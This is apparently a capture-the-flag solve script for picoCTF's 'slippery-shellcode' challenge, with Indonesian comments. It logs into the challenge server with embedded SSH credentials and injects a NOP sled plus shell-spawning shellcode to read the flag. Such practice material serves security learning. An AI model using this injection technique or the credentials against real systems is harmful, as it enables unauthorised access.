from pwn import *

def exploit():
    #p = process("./vuln")
    s = ssh(host='2019shell1.picoctf.com', user='ChaaO', password='kmz317xe92')
    p = s.process('vuln', cwd='/problems/slippery-shellcode_2_4061c12f5a4a9d8c1c3f45b25fbcb09a') 
    shellcode = asm(shellcraft.sh())
    payload = ""
    payload += "\x90" * 256 # nopsled
                            # shellcode akan di eksekusi pada offset yang random dari angka 0 - 256
                            # Untuk membypass eksekusi random tersebut, saya membuat nop sebanyak 256 sehingga shell code akan 
                            # terus mengeksekusinya sampai mendapatkan offset yang benar dimana shellcode kita akan
                            # mendapatkan shell 
    p.sendline(payload+shellcode)
    p.sendline("cat flag.txt")
    p.interactive()


if __name__ == "__main__":
    exploit()